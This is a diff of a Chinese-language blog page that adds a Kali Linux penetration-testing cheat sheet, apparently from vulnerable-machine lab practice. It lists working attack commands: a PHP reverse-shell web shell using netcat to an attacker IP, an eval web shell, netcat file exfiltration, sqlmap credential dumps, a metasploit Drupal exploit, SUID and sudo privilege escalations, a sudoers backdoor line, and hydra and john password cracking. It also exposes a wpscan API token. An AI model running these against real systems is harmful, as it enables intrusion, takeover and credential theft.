@@ -6,17 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Tag: 网络安全 | readers</title>
+  <title>kali linux常用命令 | readers</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="The backyard of readers and programmers">
-<meta property="og:type" content="website">
-<meta property="og:title" content="readers">
-<meta property="og:url" content="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.html">
+  <meta name="description" content="信息收集 nmap wetab dirsearch searchsploit   web wpscan cewl   攻击利器 metasploit sqlmap   常用命令 反弹shell 一句话木马 文件传送   提权 find提权 git提权 nmap提权 exim4 4.89 rbash升级 sudoers提权 环境变量     密码 hydra john kali linux自带密码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kali linux常用命令">
+<meta property="og:url" content="http://example.com/2024/07/26/kali-linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/index.html">
 <meta property="og:site_name" content="readers">
-<meta property="og:description" content="The backyard of readers and programmers">
+<meta property="og:description" content="信息收集 nmap wetab dirsearch searchsploit   web wpscan cewl   攻击利器 metasploit sqlmap   常用命令 反弹shell 一句话木马 文件传送   提权 find提权 git提权 nmap提权 exim4 4.89 rbash升级 sudoers提权 环境变量     密码 hydra john kali linux自带密码">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-07-26T05:21:38.000Z">
+<meta property="article:modified_time" content="2024-07-26T06:38:19.339Z">
 <meta property="article:author" content="anonymous">
-<meta property="article:tag" content="readers">
+<meta property="article:tag" content="kali linux常用命令">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="readers" type="application/atom+xml">
@@ -165,60 +167,246 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-kali-linux常用命令" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2024" class="archive-year">2024</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2024/04/19/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%89%B9%E7%82%B9/" class="archive-article-date">
-  	<time datetime="2024-04-19T09:53:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-19</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2024/04/19/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%89%B9%E7%82%B9/">网络安全特点</a>
+    <h1 class="article-title" itemprop="name">
+      kali linux常用命令
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2024/07/26/kali-linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="archive-article-date">
+  	<time datetime="2024-07-26T05:21:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-07-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a><ul>
+<li><a href="#nmap">nmap</a></li>
+<li><a href="#wetab">wetab</a></li>
+<li><a href="#dirsearch">dirsearch</a></li>
+<li><a href="#searchsploit">searchsploit</a></li>
+</ul>
+</li>
+<li><a href="#web">web</a><ul>
+<li><a href="#wpscan">wpscan</a></li>
+<li><a href="#cewl">cewl</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E5%88%A9%E5%99%A8">攻击利器</a><ul>
+<li><a href="#metasploit">metasploit</a></li>
+<li><a href="#sqlmap">sqlmap</a></li>
+</ul>
+</li>
+<li><a href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4">常用命令</a><ul>
+<li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a><ul>
+<li><a href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC">一句话木马</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E4%BC%A0%E9%80%81">文件传送</a></li>
+</ul>
+</li>
+<li><a href="#%E6%8F%90%E6%9D%83">提权</a><ul>
+<li><a href="#find%E6%8F%90%E6%9D%83">find提权</a></li>
+<li><a href="#git%E6%8F%90%E6%9D%83">git提权</a></li>
+<li><a href="#nmap%E6%8F%90%E6%9D%83">nmap提权</a></li>
+<li><a href="#exim4-489">exim4 4.89</a></li>
+<li><a href="#rbash%E5%8D%87%E7%BA%A7">rbash升级</a></li>
+<li><a href="#sudoers%E6%8F%90%E6%9D%83">sudoers提权</a></li>
+<li><a href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">环境变量</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E5%AF%86%E7%A0%81">密码</a><ul>
+<li><a href="#hydra">hydra</a></li>
+<li><a href="#john">john</a></li>
+<li><a href="#kali-linux%E8%87%AA%E5%B8%A6%E5%AF%86%E7%A0%81%E6%9C%AC%E8%8E%B7%E5%8F%96">kali linux自带密码本获取</a></li>
+</ul>
+</li>
+<li><a href="#%E5%85%B6%E4%BB%96">其他</a><ul>
+<li><a href="#dos2unix">dos2unix</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.193.0/24</span><br><span class="line"># -sP: 这个参数告诉 nmap 执行Ping扫描，也就是使用ICMP echo请求来探测目标网络中存活的主机。</span><br><span class="line"></span><br><span class="line">nmap -A -T4 -p- 192.168.193.139</span><br><span class="line"># -A: 这个选项启用操作系统检测、服务版本检测、脚本扫描和Traceroute。</span><br><span class="line"># -T4: 这个选项设置扫描速度，T4表示快速扫描，适合在内网环境中使用，以加快扫描速度而不至于对网络造成太大负担。</span><br><span class="line"># -p-: 这个选项告诉 nmap 扫描目标主机上的所有端口，而不仅仅是一些常见的端口。这种方式称为全端口扫描。</span><br></pre></td></tr></table></figure>
+<h2 id="wetab"><a href="#wetab" class="headerlink" title="wetab"></a>wetab</h2><p>网站类型查找。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://wordy/</span><br></pre></td></tr></table></figure>
+<h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://dc-2/ </span><br></pre></td></tr></table></figure>
+<h2 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Drupal</span><br></pre></td></tr></table></figure>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h2><p>专用于wordpress网站。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 获取帐号</span><br><span class="line">wpscan --url http://wordy --api-token QK4yHoAgn8S2v9r1jdeDYUO2c8XUFvwanM4AVco9nbk -e u</span><br><span class="line"></span><br><span class="line"># 获取登录用户名</span><br><span class="line">wpscan --url http://dc-2 --enumerate u</span><br><span class="line"></span><br><span class="line"># 暴力破解密码</span><br><span class="line">wpscan --url http://dc-2 -U users.txt -P p.txt</span><br></pre></td></tr></table></figure>
+<h2 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 根据网站关键字生成密码本</span><br><span class="line">cewl http://dc-2 -w p.txt</span><br></pre></td></tr></table></figure>
+<h1 id="攻击利器"><a href="#攻击利器" class="headerlink" title="攻击利器"></a>攻击利器</h1><h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 打开metasploit</span><br><span class="line">msfconsole   </span><br><span class="line"></span><br><span class="line"># 搜索攻击模块</span><br><span class="line">search Drupalgeddon</span><br><span class="line"></span><br><span class="line"># 选择攻击模块</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2 </span><br><span class="line"></span><br><span class="line"># 获取攻击模块缺失的配置选项</span><br><span class="line">show missing</span><br><span class="line"></span><br><span class="line"># 设置攻击主机ip</span><br><span class="line">set RHOSTS 192.168.193.135  </span><br><span class="line"></span><br><span class="line"># 进行渗透攻击</span><br><span class="line">run  </span><br><span class="line"></span><br><span class="line"># 获取反弹shell</span><br><span class="line">shell  </span><br></pre></td></tr></table></figure>
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># post方法</span><br><span class="line">sqlmap -u &quot;http://192.168.193.133//results.php&quot; --data=&quot;search=1&quot; --dbs --batch</span><br><span class="line"></span><br><span class="line"># get方法</span><br><span class="line">sqlmap -u &quot;http://192.168.193.131/?nid=3&quot;</span><br><span class="line">sqlmap -u &quot;http://192.168.193.131/?nid=3&quot; --dbs</span><br><span class="line">sqlmap -u &quot;http://192.168.193.131/?nid=3&quot; -D d7db --tables</span><br><span class="line">sqlmap -u &quot;http://192.168.193.131/?nid=3&quot; -D d7db -T users --columns</span><br><span class="line">sqlmap -u &quot;http://192.168.193.131/?nid=3&quot; -D d7db -T users -C name,pass --dump </span><br></pre></td></tr></table></figure>
+<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 直接连接</span><br><span class="line">&lt;?php</span><br><span class="line">system(&quot;nc -e /bin/bash 192.168.193.128 10086&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"># 使用蚁剑工具连接</span><br><span class="line">&lt;?php eval(@$_POST[&#x27;shell&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="文件传送"><a href="#文件传送" class="headerlink" title="文件传送"></a>文件传送</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.193.128 10085 &lt; old-passwords.bak</span><br><span class="line">nc -lvvp 10085 &gt; DC-4-P.txt</span><br></pre></td></tr></table></figure>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="find提权"><a href="#find提权" class="headerlink" title="find提权"></a>find提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查找具有s权限命令</span><br><span class="line">find / -perm -u=s -type f -exec ls -la &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"># find有s权限位，可用来root提权</span><br><span class="line">find / -name flag4.txt -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure>
+<h3 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+<h3 id="nmap提权"><a href="#nmap提权" class="headerlink" title="nmap提权"></a>nmap提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch root_shell.sh</span><br><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; root_shell.sh</span><br><span class="line">sudo nmap --script=root_shell.sh</span><br></pre></td></tr></table></figure>
+<h3 id="exim4-4-89"><a href="#exim4-4-89" class="headerlink" title="exim4 4.89"></a>exim4 4.89</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f -exec ls -la &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">exim4 --version</span><br><span class="line">searchsploit exim</span><br><span class="line">searchsploit -p linux/local/46996.sh</span><br></pre></td></tr></table></figure>
+<h3 id="rbash升级"><a href="#rbash升级" class="headerlink" title="rbash升级"></a>rbash升级</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br></pre></td></tr></table></figure>
+<h3 id="sudoers提权"><a href="#sudoers提权" class="headerlink" title="sudoers提权"></a>sudoers提权</h3><p>升级charles为root用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">charles ALL=(ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure>
+<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure>
+<h1 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h1><h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><p>用于暴力破解ssh密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L DC-4-U.txt -P DC-4-P.txt ssh://192.168.193.137 -t 64</span><br></pre></td></tr></table></figure>
+<h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 据文件中的密码哈希的格式自动识别，并尝试使用合适的破解方法（如暴力破解、字典攻击等）来找到密码。</span><br><span class="line">john DC-8-P.txt</span><br><span class="line"></span><br><span class="line"># 指定 --format=crypt，你告诉 John 应该使用 crypt 格式的算法来破解 shadow.txt 文件中的密码哈希，用于/etc/shadow。</span><br><span class="line">sudo unshadow /etc/passwd /etc/shadow &gt; passwd.txt</span><br><span class="line">john --format=crypt passwd.txt</span><br></pre></td></tr></table></figure>
+<h2 id="kali-linux自带密码本获取"><a href="#kali-linux自带密码本获取" class="headerlink" title="kali linux自带密码本获取"></a>kali linux自带密码本获取</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zcat /usr/share/wordlists/rockyou.txt.gz | grep k01 &gt; ./DC-6-P.txt</span><br></pre></td></tr></table></figure>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="dos2unix"><a href="#dos2unix" class="headerlink" title="dos2unix"></a>dos2unix</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat -A a.sh </span><br><span class="line"># 每个操作系统以字符表示结尾的时候是不同的，查看脚本文件若每行结尾为 ^M</span><br><span class="line"># 则需要使用命令 转换</span><br><span class="line">dos2unix a.sh </span><br></pre></td></tr></table></figure>
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">网络安全</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">kali linux常用命令</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2024/07/26/kali-linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2024/07/26/%E7%BD%91%E5%9D%80%E5%AF%BC%E8%88%AA/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          网址导航
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2024/07/22/DC-9%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">DC-9靶机攻略</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -241,9 +429,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
